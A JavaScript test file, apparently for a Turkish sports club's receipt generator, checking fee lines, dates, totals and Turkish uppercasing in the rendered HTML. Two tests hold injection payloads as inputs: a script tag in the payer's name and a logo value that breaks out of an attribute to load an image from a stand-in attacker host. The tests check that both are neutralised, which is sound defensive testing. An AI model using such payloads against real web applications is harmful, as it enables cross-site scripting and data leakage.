import { describe, it, expect } from "vitest";
import { makbuzHtml } from "../src/lib/makbuzHtml.js";

const kalemler = [{ id: 1, kod: "aidat", ad: "Aidat" }, { id: 2, kod: "forma", ad: "Forma" }, { id: 3, kod: "corap", ad: "Çorap" }];
const makbuz = { makbuz_no: "2026-0203", tarih: "2026-09-06", ad_soyad: "Kaan Yıldız", dogum_tarihi: "2015-11-02", yas_grubu_ad: "U11", toplam: 4850, odeme_yontemi: "nakit", tahsil_eden: "Şerif Çelik", not_: "",
  satirlar: [{ fee_item_id: 1, kalem_kod: "aidat", tutar: 3500, yil: 2026, ay: 9 }, { fee_item_id: 2, kalem_kod: "forma", tutar: 1200 }, { fee_item_id: 3, kalem_kod: "corap", tutar: 150 }] };

describe("makbuzHtml", () => {
  it("iki kopya, kalem tutarları, dönem ve toplam yer alır", () => {
    const h = makbuzHtml({ makbuz, kalemler, logo: "" });
    expect(h.match(/TAHSİLAT MAKBUZU/g)).toHaveLength(2);
    expect(h).toContain("2026-0203");
    expect(h).toContain("AİDAT · EYLÜL 2026");
    expect(h).toContain("3.500 ₺");
    expect(h).toContain("1.200 ₺");
    expect(h).toContain("4.850 ₺");
    expect(h).toContain("06.09.2026");
    expect(h).toContain("Nakit");
  });
  it("seçilmeyen kalemler boş satır olarak yine listelenir (kağıt makbuzla aynı düzen)", () => {
    const h = makbuzHtml({ makbuz: { ...makbuz, satirlar: [makbuz.satirlar[0]] }, kalemler, logo: "" });
    expect(h).toContain("FORMA");
    expect(h).not.toContain("1.200 ₺");
  });
  it("kalem adları Türkçe büyük harfe çevrilir (i → İ)", () => {
    const h = makbuzHtml({ makbuz, kalemler: [...kalemler, { id: 4, kod: "eldiven_bere", ad: "Eldiven & Bere" }], logo: "" });
    expect(h).toContain("ELDİVEN &amp; BERE");
  });
  it("birden fazla aidat ayı ayrı satırlarda, eskiden yeniye; dönem bilgisi virgülle", () => {
    const m = { ...makbuz, satirlar: [{ fee_item_id: 1, kalem_kod: "aidat", tutar: 3500, yil: 2026, ay: 10 }, { fee_item_id: 1, kalem_kod: "aidat", tutar: 3500, yil: 2026, ay: 9 }, { fee_item_id: 2, kalem_kod: "forma", tutar: 1200 }], toplam: 8200 };
    const h = makbuzHtml({ makbuz: m, kalemler, logo: "" });
    expect(h.indexOf("AİDAT · EYLÜL 2026")).toBeLessThan(h.indexOf("AİDAT · EKİM 2026"));
    expect(h.match(/AİDAT · EYLÜL 2026/g)).toHaveLength(2); // iki kopya
    expect(h).toContain("Eylül 2026, Ekim 2026");
    expect(h).toContain("FORMA");
    expect(h).toContain("8.200 ₺");
  });
  it("makbuzda alt yazı (hashtag satırı) yok; eski ayar geçilse bile basılmaz", () => {
    const h = makbuzHtml({ makbuz, kalemler, logo: "", altYazi: "#BirSemtinRüyası" });
    expect(h).not.toContain("BirSemtinRüyası");
    expect(h).not.toContain('class="hash"');
  });
  it("HTML enjeksiyonunu kaçırır", () => {
    const h = makbuzHtml({ makbuz: { ...makbuz, ad_soyad: "<script>x</script>" }, kalemler, logo: "" });
    expect(h).not.toContain("<script>x");
    expect(h).toContain("&lt;script&gt;");
  });

  it("logo yalnız güvenli data URL ise şablona girer (inceleme #20)", () => {
    const iyi = makbuzHtml({ makbuz, kalemler, logo: "data:image/png;base64,iVBORw0KGgo=" });
    expect(iyi).toContain('src="data:image/png;base64,iVBORw0KGgo="');
    const kotu = makbuzHtml({ makbuz, kalemler, logo: '"><img src="http://saldirgan/?x' });
    expect(kotu).not.toContain("saldirgan"); expect(kotu).not.toContain("<img");
  });
});
